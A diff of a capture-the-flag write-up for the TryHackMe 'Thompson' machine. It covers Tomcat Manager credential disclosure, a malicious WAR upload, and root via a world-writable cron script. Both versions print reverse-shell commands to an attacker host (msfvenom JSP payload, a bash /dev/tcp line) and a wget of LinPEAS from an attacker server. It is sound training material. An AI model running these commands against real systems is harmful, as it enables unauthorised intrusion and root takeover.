@@ -1,122 +1,202 @@
-1. Reconnaissance
+# 🐱 TryHackMe — Thompson
 
-I began with an Nmap scan:
+> **Difficulty:** Easy | **OS:** Linux | **Category:** Web / Privilege Escalation
+> **Author:** Aryan Barkhordar
 
-<img width="773" height="334" alt="image" src="https://github.com/user-attachments/assets/b2b30f25-4934-4050-8551-aa8014238a67" />
+---
 
-Open ports:
+## Table of Contents
 
-22 – SSH
-8009 – AJP (Apache JServ Protocol)
-8080 – Apache Tomcat 8.5.5
+- [Overview](#overview)
+- [Reconnaissance](#reconnaissance)
+  * [Port Scanning](#port-scanning)
+  * [Web Enumeration](#web-enumeration)
+- [Exploitation](#exploitation)
+  * [Tomcat Manager — Credential Disclosure](#tomcat-manager--credential-disclosure)
+  * [WAR File Upload — Remote Code Execution](#war-file-upload--remote-code-execution)
+  * [Reverse Shell](#reverse-shell)
+- [Post-Exploitation](#post-exploitation)
+  * [Shell Stabilisation](#shell-stabilisation)
+  * [User Flag](#user-flag)
+- [Privilege Escalation](#privilege-escalation)
+  * [Writable Script Discovery](#writable-script-discovery)
+  * [Cron Job Identification — LinPEAS](#cron-job-identification--linpeas)
+  * [Root Access via Cron Injection](#root-access-via-cron-injection)
+- [Flags](#flags)
+- [Summary](#summary)
 
-**Analysis**
-- Port 8080 exposed Apache Tomcat 8.5.5
-- /manager is commonly exposed in misconfigured Tomcat deployments
-- AJP (8009) was noted but not needed for exploitation
+---
 
-2. Web Enumeration
+## Overview
 
-<img width="671" height="391" alt="image" src="https://github.com/user-attachments/assets/7ef21ec7-f0d4-4c7e-a2c9-bfaf68e95ac2" />
+**Thompson** is a TryHackMe machine centred around a misconfigured **Apache Tomcat** deployment. An `nmap` scan reveals Tomcat 8.5.5 running on port 8080, alongside an AJP connector on 8009. Navigating to the Tomcat Manager and entering invalid credentials causes the 401 error page to **disclose valid credentials** in an example configuration snippet — a known Tomcat behaviour. With Manager access, a malicious **WAR file** containing a JSP reverse shell is deployed, granting an initial foothold. Privilege escalation exploits a world-writable shell script that is executed periodically by a root cron job, into which a reverse shell is injected.
 
-This revealed:
+---
 
-- /manager
+## Reconnaissance
 
-3. Tomcat Manager Credential Disclosure
+### Port Scanning
 
-After entering random credentials, the error page revealed valid credentials for:
+An `nmap` service and version scan of the target returned three open ports:
 
-- /manager/html
+```
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8009/tcp open  ajp13   (Apache Jserv Protocol)
+8080/tcp open  http    Apache Tomcat 8.5.5
+```
 
-<img width="1285" height="434" alt="image" src="https://github.com/user-attachments/assets/3a6ee706-5414-4fdb-b495-e3d47b1801c2" />
+> **Key Finding:** Port `8080` was running **Apache Tomcat 8.5.5** — a versioned Java servlet container. The AJP connector on `8009` was noted but not required for exploitation.
 
-Using the disclosed credentials, I successfully accessed the Tomcat Manager dashboard.
+---
 
-4. WAR File Upload → Remote Code Execution
+### Web Enumeration
 
-Inside /manager/html, I observed that WAR file uploads were permitted.
+Navigating to `http://<TARGET>:8080` presented the default Tomcat landing page. Directory enumeration was not necessary — the Tomcat default page itself links to the Manager application:
 
-Tomcat Manager allows application deployment by design. If authenticated, this results in code execution.
+```
+http://<TARGET>:8080/manager
+```
 
-Creating Reverse Shell WAR
+---
 
-I generated a WAR reverse shell using:
-- msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=1234 -f war -o shell.war
+## Exploitation
 
-Started a listener:
-- nc -lvnp 1234
+### Tomcat Manager — Credential Disclosure
 
-Uploaded shell.war via the Tomcat Manager interface.
+Navigating to `/manager/html` prompted for HTTP Basic Authentication credentials. Deliberately entering incorrect credentials caused the resulting **401 Unauthorized** error page to display a configuration example, which included a set of working credentials for the Manager interface.
 
-<img width="1906" height="462" alt="image" src="https://github.com/user-attachments/assets/52aa157d-c56b-4a0d-babc-41593e97016b" />
+> **Key Observation:** Apache Tomcat's default 401 error page historically included a helptext block showing example `tomcat-users.xml` configuration — often with credentials that administrators had forgotten to change or remove. This is a well-known information disclosure behaviour in older Tomcat deployments.
 
-After deployment, I navigated to the shell I uploaded. This triggered a reverse shell.
+The disclosed credentials were used to successfully authenticate to `/manager/html`, gaining access to the Tomcat Manager dashboard.
 
-<img width="524" height="64" alt="image" src="https://github.com/user-attachments/assets/5e31967f-b869-47c7-a62e-12b4d1ca1c73" />
+---
 
-5. User Flag
+### WAR File Upload — Remote Code Execution
 
-After gaining a shell, I stabilised it:
-- python3 -c 'import pty; pty.spawn("/bin/bash")'
+The Tomcat Manager interface includes a **WAR file deployment** feature — this is by design for application deployment, but when accessible with known credentials it results in direct code execution.
 
-Navigated to:
-- cd /home/jack
+A malicious WAR file containing a JSP reverse shell was generated using `msfvenom`:
 
-Found:
-- user.txt
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER IP> LPORT=1234 -f war -o shell.war
+```
 
-Successfully retrieved the user flag.
+The WAR file was uploaded via the Manager's deploy form. Tomcat deployed the application and exposed it at:
 
-<img width="316" height="54" alt="image" src="https://github.com/user-attachments/assets/989ae4b2-4491-41ac-bda4-563f67076759" />
+```
+http://<TARGET>:8080/shell/
+```
 
-6. Privilege Escalation
+---
 
-While enumerating the system, I found a file in /home/jack:
+### Reverse Shell
 
-- id.sh
+A Netcat listener was established prior to triggering the payload:
 
-Contents:
+```
+nc -lvnp 1234
+```
 
-**#!/bin/bash
-id > test.txt**
+Navigating to the deployed application in the browser triggered the JSP reverse shell, and the listener received a connection — providing an interactive shell on the target running as the Tomcat service user.
 
-**Analysis**
-- The script runs id and writes output to a file.
-- File permissions showed it was writable to all users.
+---
 
-<img width="537" height="260" alt="image" src="https://github.com/user-attachments/assets/764f0477-4e48-437b-873d-91c499812a90" />
+## Post-Exploitation
 
-7. Cronjob Discovery
+### Shell Stabilisation
 
-Running LinPEAS:
-- ./linpeas.sh
+The initial shell was a basic TTY. It was upgraded using Python:
 
-Revealed:
-- id.sh was executed by a cronjob
-- It was running as root
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-This is a critical privilege escalation vector:
+---
 
-- World-writable script
-- Executed as root via cron
+### User Flag
 
-<img width="818" height="174" alt="image" src="https://github.com/user-attachments/assets/74cd8904-7faa-4208-b8f9-2e716afcb6bd" />
+The user flag was located in Jack's home directory:
 
-8. Exploiting the Cronjob
+```
+$ cat /home/jack/user.txt
+THM{REDACTED}
+```
 
-I replaced the contents of id.sh with a reverse shell:
+---
 
-- echo 'bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1' > id.sh
+## Privilege Escalation
 
-Started a listener again:
-- nc -lvnp 1234
+### Writable Script Discovery
 
-Waited for the cronjob to execute (approximately 1 minute).
+While enumerating `/home/jack`, a shell script named `id.sh` was discovered with the following contents:
 
-The reverse shell connected back as:
-- root
-  
-With this shell, I was able to reteieve the root flag to complete the CTF.
+```bash
+#!/bin/bash
+id > /home/jack/test.txt
+```
 
-<img width="645" height="165" alt="image" src="https://github.com/user-attachments/assets/46d3644b-b60d-4dd0-bf76-8bfd3d60c2fc" />
+Checking the file permissions revealed the script was **world-writable** — any user on the system could modify its contents.
+
+> **Key Observation:** A world-writable script is only a privilege escalation vector if something privileged executes it. The next step was to determine what, if anything, ran it automatically.
+
+---
+
+### Cron Job Identification — LinPEAS
+
+LinPEAS was uploaded and executed to identify scheduled tasks:
+
+```
+wget http://<ATTACKER>:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh
+```
+
+The output confirmed that `id.sh` was being executed by a **root cron job** running at a regular interval.
+
+> **Key Observation:** A world-writable script executed periodically by `root` is a direct path to privilege escalation — injecting a reverse shell into it will execute with root privileges when the cron job next fires.
+
+---
+
+### Root Access via Cron Injection
+
+A bash reverse shell payload was written into `id.sh`, overwriting its contents:
+
+```bash
+echo 'bash -i >& /dev/tcp/<ATTACKER IP>/1234 0>&1' > /home/jack/id.sh
+```
+
+A Netcat listener was restarted on port 1234. Within approximately one minute, the cron job executed the modified script and the listener received a shell running as `root`.
+
+The **root flag** was retrieved to complete the machine:
+
+```
+# cat /root/root.txt
+THM{REDACTED}
+```
+
+---
+
+## Flags
+
+| Flag        | Value           |
+| ----------- | --------------- |
+| 🏳️ **User** | `THM{REDACTED}` |
+| 🚩 **Root**  | `THM{REDACTED}` |
+
+---
+
+## Summary
+
+| Stage                    | Technique                                                                             |
+| ------------------------ | ------------------------------------------------------------------------------------- |
+| **Recon**                | `nmap` scan, Tomcat 8.5.5 on port 8080 identified                                    |
+| **Credential Disclosure**| Tomcat 401 error page leaks valid Manager credentials in helptext                     |
+| **Initial Access**       | WAR file containing JSP reverse shell deployed via Tomcat Manager                    |
+| **Shell**                | Reverse shell triggered by browsing to the deployed app → Netcat listener             |
+| **Enumeration**          | LinPEAS confirms world-writable `id.sh` is executed by a root cron job                |
+| **Privilege Escalation** | Reverse shell injected into `id.sh` → executed by root cron → root shell             |
+
+---
+
+*Writeup by Aryan Barkhordar*
